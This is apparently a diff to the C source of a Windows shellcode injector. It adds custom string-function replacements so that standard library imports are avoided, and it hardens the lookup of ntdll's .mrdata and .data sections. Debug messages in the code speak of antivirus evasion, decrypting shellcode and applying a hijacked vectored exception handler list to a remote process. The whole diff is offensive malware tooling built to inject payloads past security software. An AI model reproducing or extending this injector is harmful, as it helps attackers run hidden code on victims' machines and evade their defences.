@@ -33,7 +33,40 @@ void PrintDbgA(char* message);
 void PrintDbgW(wchar_t* message);
 void ErrExit();
 
-void main() {
+// Customized CRT Functions
+size_t SFstrlen(const char* s);
+size_t SFwcslen(const wchar_t* s);
+wchar_t* SFwcsstr(const wchar_t* haystack, const wchar_t* needle);
+int SFstrcmp(const char* a, const char* b);
+size_t __imp_wcslen(const wchar_t* s);
+size_t strlen(const char* s);
+
+FORCEINLINE VOID SFRtlInitUnicodeString( // 使用自定义wcslen的RtlInitUnicodeString宏 其余一致
+	_Out_ PUNICODE_STRING DestinationString,
+	_In_opt_z_ PCWSTR SourceString
+)
+{
+	if (SourceString)
+		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(SFwcslen(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
+	else
+		DestinationString->MaximumLength = DestinationString->Length = 0;
+	DestinationString->Buffer = (PWCH)SourceString;
+}
+
+FORCEINLINE VOID SFRtlInitAnsiString( // 与上个函数同理
+	_Out_ PANSI_STRING DestinationString,
+	_In_opt_z_ PCSTR SourceString
+)
+{
+	if (SourceString)
+		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)SFstrlen(SourceString)) + sizeof(ANSI_NULL);
+	else
+		DestinationString->MaximumLength = DestinationString->Length = 0;
+
+	DestinationString->Buffer = (PCHAR)SourceString;
+}
+
+void InjectorEntry() {
 	PrintDbgW(L"[!] 处于调试模式 可能降低免杀效果! | Currently in DEBUG mode, AV evasion effectiveness may be affected!\n");
 	NTSTATUS status;
 	PVOID VEH = AddVectoredExceptionHandler(1, ExceptionHandler); // GalaxyGate VEH
@@ -58,12 +91,16 @@ void main() {
 	PrintDbgW(L"[+] Shellcode解密完成 | Shellcode decryption completed\n");
 	DWORD mrdataSize;
 	PVOID mrdataVa;
-	GetNtdllSectionVa(".mrdata", &mrdataVa, &mrdataSize);
-
+	if (!GetNtdllSectionVa(".mrdata", &mrdataVa, &mrdataSize)) {
+		PrintDbgW(L"[-] 获取NtDLL .mrdata段失败");
+		ErrExit();
+	}
 	DWORD dataSize;
 	PVOID dataVa;
-	GetNtdllSectionVa(".data", &dataVa, &dataSize);
-
+	if (!GetNtdllSectionVa(".data", &dataVa, &dataSize)) {
+		PrintDbgW(L"[-] 获取NtDLL .data段失败");
+		ErrExit();
+	}
 	// 从本地获取VEH链表头地址 和远程进程相同 可以直接应用到远程进程
 	PVOID LdrpVectoredHandlerList = findLdrpVectorHandlerList(VEH);
 	if (LdrpVectoredHandlerList == NULL) {
@@ -95,10 +132,10 @@ void main() {
 	PVOID encodedShellcodePointer = NULL;
 	PVOID ntdllBase = NULL;
 	UNICODE_STRING usNtdll;
-	RtlInitUnicodeString(&usNtdll, L"ntdll.dll");
+	SFRtlInitUnicodeString(&usNtdll, L"ntdll.dll");
 	status = LdrGetDllHandle(NULL, NULL, &usNtdll, &ntdllBase);
 	ANSI_STRING asFunc;
-	RtlInitAnsiString(&asFunc, "RtlEncodeRemotePointer");
+	SFRtlInitAnsiString(&asFunc, "RtlEncodeRemotePointer");
 	typedef NTSTATUS(NTAPI* PRtlEncodeRemotePointer)(HANDLE ProcessHandle, PVOID Ptr, PVOID* EncodedPtr);
 	PRtlEncodeRemotePointer pRtlEncodeRemotePointer = NULL;
 	status = LdrGetProcedureAddress(ntdllBase, &asFunc, 0, (PVOID*)&pRtlEncodeRemotePointer);
